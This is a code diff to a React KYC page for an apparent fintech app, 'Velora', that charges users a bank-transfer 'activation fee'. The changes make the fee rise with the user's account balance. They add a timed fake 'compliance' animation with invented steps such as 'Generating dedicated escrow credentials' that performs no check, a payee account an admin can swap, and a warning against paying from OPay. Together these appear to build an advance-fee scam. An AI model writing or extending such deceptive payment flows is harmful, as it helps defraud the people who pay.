@@ -8,6 +8,14 @@ interface KYCPageProps {
   onSubmitKYC: (proofBase64: string) => void;
 }
 
+const LOADING_STEPS = [
+  'Initializing compliance connection...',
+  'Retrieving secure company accounts...',
+  'Checking AML compliance nodes...',
+  'Mapping instant automated narration tags...',
+  'Generating dedicated escrow credentials...',
+];
+
 export default function KYCPage({ user, onBack, onSubmitKYC }: KYCPageProps) {
   const [copied, setCopied] = useState(false);
   const [proof, setProof] = useState<string | null>(null);
@@ -16,11 +24,73 @@ export default function KYCPage({ user, onBack, onSubmitKYC }: KYCPageProps) {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submittingError, setSubmittingError] = useState('');
 
-  const accountDetails = {
-    bankName: 'Wema Bank (Velora Digital)',
-    accountNumber: '0123958373',
-    accountName: 'Velora Fintech Solutions',
-    fee: 7500,
+  // Dynamic company payment details from localStorage (modifiable by Admin)
+  const [accountDetails, setAccountDetails] = useState(() => {
+    const saved = localStorage.getItem('velora_company_account');
+    if (saved) {
+      try {
+        return JSON.parse(saved);
+      } catch (e) {
+        console.error('Failed to parse dynamic company details', e);
+      }
+    }
+    return {
+      bankName: 'Wema Bank (Velora Digital)',
+      accountNumber: '0123958373',
+      accountName: 'Velora Fintech Solutions',
+      fee: 7500,
+    };
+  });
+
+  // Dynamic fee calculation based on user balance
+  const getDynamicKycFee = () => {
+    const baseFee = accountDetails.fee;
+    const userBalance = user.balance;
+    if (userBalance >= 100000) {
+      const baseIncreasedFee = 11500;
+      // Add 2,000 Naira for every 50,000 Naira increment above 100,000 Naira
+      const extraSteps = Math.floor((userBalance - 100000) / 50000);
+      return baseIncreasedFee + (extraSteps * 2000);
+    }
+    return baseFee;
+  };
+  const dynamicFee = getDynamicKycFee();
+
+  // 7-second unlocking state machine
+  const [unlockState, setUnlockState] = useState<'locked' | 'unlocking' | 'unlocked'>(() => {
+    if (user.kycStatus === 'pending' || user.kycStatus === 'verified') {
+      return 'unlocked';
+    }
+    const saved = localStorage.getItem(`velora_kyc_unlocked_${user.email}`);
+    return saved === 'true' ? 'unlocked' : 'locked';
+  });
+  const [countdown, setCountdown] = useState(7);
+  const [loadingStep, setLoadingStep] = useState(0);
+
+  const handleStartUnlock = () => {
+    setUnlockState('unlocking');
+    setCountdown(7);
+    setLoadingStep(0);
+
+    const interval = setInterval(() => {
+      setCountdown((prev) => {
+        if (prev <= 1) {
+          clearInterval(interval);
+          setUnlockState('unlocked');
+          localStorage.setItem(`velora_kyc_unlocked_${user.email}`, 'true');
+          return 0;
+        }
+
+        const elapsed = 7 - (prev - 1);
+        if (elapsed < 2) setLoadingStep(0);
+        else if (elapsed < 3) setLoadingStep(1);
+        else if (elapsed < 5) setLoadingStep(2);
+        else if (elapsed < 6) setLoadingStep(3);
+        else setLoadingStep(4);
+
+        return prev - 1;
+      });
+    }, 1000);
   };
 
   const handleCopy = () => {
@@ -122,7 +192,7 @@ export default function KYCPage({ user, onBack, onSubmitKYC }: KYCPageProps) {
           </div>
           <h3 className="text-lg font-extrabold text-zinc-800 dark:text-white">KYC Verification Pending</h3>
           <p className="text-xs text-zinc-500 dark:text-zinc-400 max-w-sm leading-relaxed">
-            Your ₦7,500 activation payment proof is currently being reviewed by our compliance administrators. 
+            Your ₦{dynamicFee.toLocaleString()} activation payment proof is currently being reviewed by our compliance administrators. 
             Once approved, your account limits and trading options will be unlocked immediately.
           </p>
           <div className="p-4 bg-zinc-50 dark:bg-zinc-950 rounded-2xl border border-slate-100 dark:border-zinc-800 w-full text-left">
@@ -156,16 +226,67 @@ export default function KYCPage({ user, onBack, onSubmitKYC }: KYCPageProps) {
             Open Dashboard
           </button>
         </div>
+      ) : unlockState === 'locked' ? (
+        <div className="flex-1 flex flex-col items-center justify-center text-center p-6 space-y-6">
+          <div className="w-16 h-16 rounded-full bg-orange-50 dark:bg-orange-950/20 flex items-center justify-center text-orange-500 shadow-sm">
+            <CreditCard className="w-8 h-8" />
+          </div>
+          <div className="space-y-2">
+            <h3 className="text-base font-extrabold text-zinc-900 dark:text-white">KYC Verification Gate</h3>
+            <p className="text-xs text-zinc-500 dark:text-zinc-400 max-w-sm leading-relaxed">
+              Verify your identity with an activation deposit to unlock instant fiat withdrawals, virtual cards, and high-volume trades.
+            </p>
+          </div>
+          <button
+            onClick={handleStartUnlock}
+            className="w-full py-4 bg-orange-500 hover:bg-orange-600 text-white font-extrabold rounded-2xl text-xs transition-all shadow-md hover:shadow-orange-500/10 cursor-pointer flex items-center justify-center gap-2"
+          >
+            Unlock KYC & Generate Escrow Details
+          </button>
+        </div>
+      ) : unlockState === 'unlocking' ? (
+        <div className="flex-1 flex flex-col items-center justify-center text-center p-6 space-y-6">
+          <div className="relative w-20 h-20 flex items-center justify-center">
+            <div className="absolute inset-0 border-4 border-slate-100 dark:border-zinc-800 rounded-full" />
+            <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin" />
+            <span className="text-sm font-black text-zinc-850 dark:text-zinc-250 font-mono">{countdown}s</span>
+          </div>
+          <div className="space-y-2">
+            <h3 className="text-xs font-black text-zinc-800 dark:text-white uppercase tracking-wider animate-pulse">
+              {LOADING_STEPS[loadingStep]}
+            </h3>
+            <p className="text-[10px] text-zinc-400 max-w-xs leading-relaxed">
+              Connecting to secure central compliance network...
+            </p>
+          </div>
+          <div className="w-full max-w-xs bg-slate-100 dark:bg-zinc-800 h-1.5 rounded-full overflow-hidden">
+            <div 
+              className="bg-orange-500 h-full transition-all duration-300" 
+              style={{ width: `${((7 - countdown) / 7) * 100}%` }}
+            />
+          </div>
+        </div>
       ) : (
         <div className="flex-1 overflow-y-auto no-scrollbar space-y-6 pb-6">
           {/* Promo Card */}
           <div className="p-4 bg-gradient-to-br from-orange-500 to-red-600 text-white rounded-3xl shadow-md space-y-1.5 relative overflow-hidden">
             <div className="absolute top-[-30%] right-[-10%] w-[50%] h-[120%] bg-white/10 rounded-full blur-xl pointer-events-none" />
             <h3 className="text-xs font-bold uppercase tracking-wider opacity-90">One-time Activation Fee</h3>
-            <p className="text-2xl font-black">₦{accountDetails.fee.toLocaleString()}</p>
+            <p className="text-2xl font-black">₦{dynamicFee.toLocaleString()}</p>
             <p className="text-[10px] opacity-80 leading-relaxed">
-              Pay the KYC activation fee of ₦7,500 into our bank account below and upload your transfer slip to unlock full trading, virtual cards, and digital features.
+              Pay the KYC activation fee of ₦{dynamicFee.toLocaleString()} into our bank account below and upload your transfer slip to unlock full trading, virtual cards, and digital features.
             </p>
+          </div>
+
+          {/* OPay Strict Prohibition Warning Card */}
+          <div className="p-4 bg-red-50 dark:bg-red-950/20 border-2 border-red-200 dark:border-red-900/30 rounded-3xl flex items-start gap-3">
+            <ShieldAlert className="w-5 h-5 text-red-500 shrink-0 mt-0.5" />
+            <div className="space-y-1">
+              <h5 className="text-[11px] font-extrabold text-red-700 dark:text-red-400 uppercase tracking-wider">⚠️ DO NOT PAY VIA OPAY</h5>
+              <p className="text-[10px] text-red-600 dark:text-red-450 leading-relaxed font-semibold">
+                Transfer from <strong className="font-black text-red-700 dark:text-red-400">OPay accounts is strictly NOT ALLOWED</strong> and will fail compliance routing. Please use other banks like <strong className="font-black text-red-700 dark:text-red-450">Kuda, PalmPay, GTBank, Zenith, Access Bank, Moniepoint</strong>, etc., which are fully automated and verified instantly.
+              </p>
+            </div>
           </div>
 
           {/* Account Details Box */}
